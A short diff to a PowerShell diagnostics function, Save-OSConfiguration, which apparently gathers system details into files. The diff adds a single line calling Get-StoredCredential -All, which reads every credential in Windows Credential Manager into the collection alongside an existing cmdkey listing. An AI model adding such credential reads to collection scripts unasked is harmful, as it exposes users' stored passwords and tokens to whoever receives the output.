@@ -3687,6 +3687,7 @@ function Save-OSConfiguration {
         @{ScriptBlock = { Get-Volume } }
         @{ScriptBlock = { Get-NetFrameworkVersion } }
         @{ScriptBlock = { cmdkey /list }; FileName = 'cmdkey.txt' }
+        @{ScriptBlock = { Get-StoredCredential -All} }
 
         $userArg = @{ User = $User }
         @{ScriptBlock = { param($User) Get-WebView2 @PSBoundParameters }; ArgumentList = $userArg }
